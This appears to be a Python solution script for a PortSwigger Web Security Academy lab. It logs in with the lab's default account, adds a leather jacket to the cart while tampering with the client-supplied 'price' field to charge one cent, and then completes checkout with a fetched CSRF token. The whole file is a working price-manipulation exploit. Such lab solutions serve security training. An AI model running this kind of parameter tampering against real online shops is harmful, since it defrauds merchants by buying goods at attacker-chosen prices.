from web_security_academy.core.utils import print_info, print_success, print_fail
from bs4 import BeautifulSoup


def solve_lab(session):
    session.login("wiener", "peter")

    # Adding a "Lightweight l33t leather jacket" to cart with a price of $0.01
    print_info('Sending a POST request to "/cart" with the following data:')
    data = {"productId": "1", "quantity": "1", "redir": "PRODUCT", "price": "1"}
    print(data)

    resp = session.post_path("/cart", data=data)
    if resp.status_code != 200:
        print_fail("POST request failed.")
    else:
        print_success("POST request successful.\n")

    # Checking out
    csrf = session.get_csrf_token("/cart", n=2)
    print_info("Proceeding to checkout...")
    resp = session.post_path(
        "/cart/checkout", data={"csrf": csrf}, allow_redirects=False
    )

    if resp.headers["Location"] != "/cart/order-confirmation?order-confirmed=true":
        print_fail("Unable to checkout.")
    else:
        print_success("Success!\n")
        session.get_path(resp.headers["Location"])
